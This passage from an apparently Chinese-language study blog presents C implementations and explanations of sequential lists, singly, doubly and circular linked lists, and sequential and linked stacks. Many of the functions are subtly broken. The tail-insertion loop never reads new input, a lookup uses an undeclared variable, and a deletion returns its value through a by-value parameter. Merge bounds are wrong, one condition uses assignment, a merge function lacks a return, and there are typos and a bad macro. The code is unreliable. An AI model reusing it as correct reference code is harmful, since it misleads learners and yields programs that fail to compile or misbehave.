class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺序表的插入运算:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SqList *<span class="title">Insert_SqList</span><span class="params">(SqList *L,<span class="keyword">int</span> i,ElemType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//在顺序表L第i个位置插入值为x的元素</span></span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length&gt;=MAXSIZE<span class="number">-1</span>)<span class="comment">//判断表是否满</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;顺序表已满!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>||i&gt;L-&gt;length+<span class="number">1</span>)<span class="comment">//判断插入位置是否合理</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;插入位置i不合理!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> m=L-&gt;length<span class="number">-1</span>;m&gt;=i<span class="number">-1</span>;m--)</span><br><span class="line">    &#123;</span><br><span class="line">        L-&gt;data[m+<span class="number">1</span>]=L-&gt;data[m];<span class="comment">//节点后移</span></span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;data[i<span class="number">-1</span>]=x;<span class="comment">//新元素插入</span></span><br><span class="line">    L-&gt;length++;<span class="comment">//表长加1</span></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺序表的删除运算:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SqList *<span class="title">Delete_SqList</span><span class="params">(SqList *L,<span class="keyword">int</span> i,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//删除顺序表L中第i个元素,删除元素的值保存在e中</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>||i&gt;L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;插入位置i不合理!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    e=L-&gt;data[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i;i&lt;=L-&gt;length<span class="number">-1</span>;++i)</span><br><span class="line">        L-&gt;data[i<span class="number">-1</span>]=L-&gt;data[i];</span><br><span class="line">    L-&gt;length--;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺序表按值查找运算:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem_Sq</span><span class="params">(SqList *L,ElemType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//在顺序表中查找值为x的元素,查找成功返回元素存储位置</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(L-&gt;data[i]==x)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺序表合并算法:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SqList *<span class="title">Merge_SqList</span><span class="params">(SqList *A,SqList *B)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//将两个非递减次序排列的顺序表A和B合并为一个新的有序顺序表C</span></span><br><span class="line">    SqList *C;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    i=<span class="number">0</span>;j=<span class="number">0</span>;k=<span class="number">0</span>;</span><br><span class="line">    C=(SqList *)<span class="built_in">malloc</span>(<span class="number">2</span>*MAXSIZE*<span class="keyword">sizeof</span>(SqList));</span><br><span class="line">    <span class="keyword">if</span>(!C) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    C-&gt;length=A-&gt;length+B-&gt;length;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=A-&gt;length<span class="number">-1</span>&amp;&amp;j&lt;=B-&gt;length)</span><br><span class="line">        <span class="keyword">if</span>(A-&gt;data[i]&lt;B-&gt;data[j])</span><br><span class="line">        &#123;</span><br><span class="line">            C-&gt;data[k]=A-&gt;data[i];k++;i++;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            C-&gt;data[k]=B-&gt;data[j];k++;j++;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//前面部分是先将A,B中较短的填入C,后面再填入另一个</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;=A-&gt;length<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        C-&gt;data[k]=A-&gt;data[i];k++;i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j&lt;B-&gt;length<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        C-&gt;data[k]=B-&gt;data[j];k++;j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="线性表的链式存储结构"><a href="#线性表的链式存储结构" class="headerlink" title="线性表的链式存储结构:"></a>线性表的链式存储结构:</h3><h4 id="1-单链表-动态链表"><a href="#1-单链表-动态链表" class="headerlink" title="1.单链表(动态链表)"></a>1.单链表(动态链表)</h4><p>静态链表是用类似于数组方法实现的，是顺序的存储结构，在物理地址上是连续的，而且需要预先分配地址空间大小。所以静态链表的初始长度一般是固定的，在做插入和删除操作时不需要移动元素，仅需修改指针</p>
<p>单链表节点数据类型:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">LinkList</span>;</span></span><br></pre></td></tr></table></figure>
<p>头插入法建立单链表:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkList <span class="title">CreatList_L1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList L;</span><br><span class="line">    LinkList P;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    L=(LinkList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=(LinkList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        p-&gt;data=x;</span><br><span class="line">        p-&gt;next=L-&gt;next;</span><br><span class="line">        L-&gt;next=p;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尾插入法建立单链表:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkList <span class="title">CreatList_L2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList L,p,r;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    r=L=(LinkList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=(LinkList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        p-&gt;data=x;</span><br><span class="line">        p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        r-&gt;next=p;</span><br><span class="line">        r=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>求链表长度的算法:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listlength</span><span class="params">(LinkList L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList p;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    p=L;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查找操作:</p>
<p>​            1.按序号查找</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkList <span class="title">Get_LinkList</span><span class="params">(LinkList L,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//在链表L中查找第i个元素,找到返回其指针,否则返回空</span></span><br><span class="line">    LinkList p;</span><br><span class="line">    p=L;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>&amp;&amp;j&lt;i)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j==i)<span class="keyword">return</span> p;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​            2.按值查找</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkList <span class="title">Locate_LinkList</span><span class="params">(LinkList L,ElemType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList p;</span><br><span class="line">    p=L;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>&amp;&amp;p-&gt;data!=x)</span><br><span class="line">       p=p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插入运算:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkList <span class="title">ListInsert</span><span class="params">(LinkList L,<span class="keyword">int</span> i,ElemType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//在单链表第i个节点前插入新元素x</span></span><br><span class="line">    LinkList p,s;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p=L;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>&amp;&amp;j&lt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>||j&gt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;参数i错误!&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    s=(LinkList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除运算:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkList <span class="title">ListDelete</span><span class="params">(LinkList L,<span class="keyword">int</span> i,ElemType *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//删除单链表L中第i个元素</span></span><br><span class="line">    LinkList p,q;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p=L;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>&amp;&amp;j&lt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next=<span class="literal">NULL</span>||j&gt;i<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;参数i错误!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    q=p-&gt;next;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    *e=q-&gt;data;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有序链表归并算法:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkList <span class="title">Merge_LinkList</span><span class="params">(LinkList A,LinkList B)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//A,B均为带头节点的单链表</span></span><br><span class="line">    LinkList C,p,q,s;</span><br><span class="line">    p=A-&gt;next;</span><br><span class="line">    q=B-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    C=A;</span><br><span class="line">    C-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;q)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data&lt;q-&gt;data)&#123;s=p;p=p-&gt;next;&#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;s=q;q=q-&gt;next;&#125;</span><br><span class="line">        s-&gt;next=C-&gt;next;</span><br><span class="line">        C-&gt;next=s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)p=q;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        s=p;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        s-&gt;next=C-&gt;next;</span><br><span class="line">        C-&gt;next=s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-循环链表"><a href="#2-循环链表" class="headerlink" title="2.循环链表"></a>2.循环链表</h4><p>1.单向循环链表</p>
<p>单链表尾节点的指针域是空指针.而单向循环链表的最后一个节点的指针指向链表头节点.</p>
<p>对于单链表,从一已知节点只能访问该节点及其后继节点,无法访问该节点之前的节点;而对于单向循环链表,只要知道表中任一节点的地址,就可搜寻到所有其他节点的地址,遍历整个链表.</p>
<p>单向循环链表的数据类型定义与单链表相同.在单循环链表上的操作也与单链表基本相同,二者主要区别在于:判断是否达到表尾的条件不同.在单链表中,用指针域是否为NULL作为判断表尾节点的条件;而在循环链表中,则以节点指针域是否等于表头节点(头指针)作为判断到达表尾的条件.</p>
<p>2.双向链表</p>
<p>双向链表的结构:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLnode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLnode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DuLnode;</span><br><span class="line"><span class="keyword">typedef</span> DuLnode *DuLinkList;</span><br></pre></td></tr></table></figure>
<p>双向链表的插入运算:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">DuLinkList <span class="title">ListInsert_Dul</span><span class="params">(DuLinkList L,<span class="keyword">int</span> i,ElemType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//在双向链表的第i个节点前插入一个新元素x</span></span><br><span class="line">	DuLinkList p,s;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    p=L;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;j&lt;i)</span><br><span class="line">    &#123;p=p-&gt;next;j++&#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>||j&lt;i)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;参数i错误!&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span>(!(s=(DuLinkList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DuLnode))))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;prior=p-&gt;prior;p-&gt;prior-&gt;next=s;</span><br><span class="line">    s-&gt;next=p;p-&gt;prior=s;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>双向链表的删除运算:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">DuLinkList <span class="title">ListDelete_Dul</span><span class="params">(DuLinkList L,<span class="keyword">int</span> i,ElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//删除双向链表中第i数据元素</span></span><br><span class="line">    DuLinkList p;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    p=L;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;j&lt;i)</span><br><span class="line">    &#123;p=p-&gt;next;j++;&#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>||j&gt;i)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;参数i错误!&quot;</span>);<span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        e=p-&gt;data;</span><br><span class="line">        p-&gt;prior-&gt;next=p-&gt;next;</span><br><span class="line">        p-&gt;next-&gt;prior=p-&gt;prior;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> L;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="三-栈与队列"><a href="#三-栈与队列" class="headerlink" title="三.栈与队列"></a>三.栈与队列</h2><p>栈和队列是在程序设计中被广泛使用的两种数据结构.由于从数据结构角度看,栈和队列是两种特殊的线性表.它们的逻辑结构和线性表相同,只是其运算规则较线性表有更多的限制,因此,也可以将栈和队列称为操作受限的线性表.</p>
<p>栈是限定仅在表尾进行插入和删除操作的线性表.队列是只允许在一端进行插入操作,而在另一端进行删除操作的线性表.</p>
<h3 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h3><ul>
<li>栈是一种特殊的线性表,是一种只允许在表的一端进行插入或删除操作的线性表.把栈中允许进行插入,删除操作的一端称为栈顶,栈的另一端称为栈底.</li>
<li>当栈中没有数据元素时,称之为空栈.栈顶是动态的,对栈顶位置的标记称为栈顶指针.栈的插入操作通常称为进栈(入栈或压栈),栈的删除操作通常称为退栈或出栈.</li>
<li>根据栈的定义,每次进栈的数据元素都放在当前栈顶元素之前而成为新的栈顶元素,每次退栈的数据元素都是当前栈顶元素.这样,最后进入栈的数据元素总是最先退出栈,因此,栈具有”后进先出”的特性,所以栈又称为后进先出的线性表,简称LIFO表.</li>
</ul>
<h3 id="栈的存储结构"><a href="#栈的存储结构" class="headerlink" title="栈的存储结构"></a>栈的存储结构</h3><p>栈有两种存储表示方法,即顺序存储和链式存储.顺序存储的栈称为顺序栈,链式存储的栈称为链式栈.</p>
<h4 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h4><p>顺序栈的存储结构:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> StackInitSize 100;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> StackElementType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    StackElementType data[StackInitSize];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;SeqStack;</span><br></pre></td></tr></table></figure>
<p>顺序栈的初始化:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SeqStack *<span class="title">InitStack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SeqStack *s;</span><br><span class="line">    s=(SeqStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SeqStack));</span><br><span class="line">    <span class="keyword">if</span>(s!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;s-&gt;top=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> s;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;没有足够的内存空间,申请失败,程序运行终止!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断栈空的函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsEmpty</span><span class="params">(SeqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>(s-&gt;top==<span class="number">-1</span>)?<span class="number">1</span>:<span class="number">0</span>;<span class="comment">//栈空返回1,否则返回0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>销毁栈的函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryStack</span><span class="params">(SeqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;栈已销毁!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进栈操作:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Push</span><span class="params">(SeqStack *s,StackElementType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top==StackInitSize)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈满!栈发生上溢,程序停止运行!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        s-&gt;top++;</span><br><span class="line">        s-&gt;data[s-&gt;top]=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>退栈操作:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">StackElementType <span class="title">Pop</span><span class="params">(SeqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    StackElementType temp;</span><br><span class="line">    <span class="keyword">if</span>(IsElpty(s))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;栈空!栈发生下溢,程序停止运行!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        temp=s-&gt;data[s-&gt;top];</span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读取栈顶元素:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">StackElementType <span class="title">GetTop</span><span class="params">(SeqStack *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsEmpty(s))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;空栈,程序停止运行!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> s-&gt;data[s-&gt;top];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>栈浮动技术:</p>
<p>当一个程序中同时使用多个顺序栈时,为了防止上溢错误,需要为每个栈分配较大的存储空间.在多栈使用过程中通常会出现:在某一栈发生上溢的同时,其余栈尚有大量未用空间存在,这样不利于内存空间的共享,会降低内存空间的使用效率.如果将多个栈安排在同一个连续的存储空间中,这样多个栈共享存储空间,并使它们根据实际情况互相调节余缺.如此既节省了存储空间的开销,又降低了上溢现象发生的概率.这种多栈共享空间的技术,通常称为栈浮动技术.</p>
<p>当程序中同时使用两个栈时,两个栈可以共享同一存储空间.此时,将两个栈的栈底分别设在同一存储空间的两端,让两个栈各自向中间延伸.这样只有当整个共享空间被两个栈占满(两个栈的栈顶相遇)时,才会发生上溢.</p>
<p>两栈共享空间的结构:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    StackElementType data[StackInitSize];</span><br><span class="line">    <span class="keyword">int</span> top1;<span class="comment">//栈1栈顶指针</span></span><br><span class="line">    <span class="keyword">int</span> top2;<span class="comment">//栈2栈顶指针</span></span><br><span class="line">&#125;SqDoubleStack;</span><br></pre></td></tr></table></figure>
<p>对于两栈共享空间的进栈方法,我们除了要插入元素值参数外,还需要有一个判断是栈1还是栈2的栈号参数stackNumber</p>
<h4 id="链式栈"><a href="#链式栈" class="headerlink" title="链式栈"></a>链式栈</h4><p>链式栈的存储结构:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> StackElementType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    StackElementType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkStack;</span><br></pre></td></tr></table></figure>
<p>链式栈的进栈操作:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkStack *<span class="title">Push</span><span class="params">(LinkStack *top,StackElementType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkStack *p;</span><br><span class="line">    p=(LinkStack *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkStack));</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;p-&gt;data=x;</span><br><span class="line">         p-&gt;next=top;</span><br><span class="line">         top=p;</span><br><span class="line">         <span class="keyword">return</span> top;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;内存不足,程序运行停止!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>链式栈的退栈操作:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkStack *<span class="title">Pop</span><span class="params">(LinkStack *top,StackElementType *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkStack *temp;</span><br><span class="line">    <span class="keyword">if</span>(top)</span><br><span class="line">    &#123;</span><br><span class="line">        temp=top;</span><br><span class="line">        *elem=top-&gt;data;</span><br><span class="line">        top=top-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">        <span class="keyword">return</span> top;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>链式栈读取栈顶元素:</p>
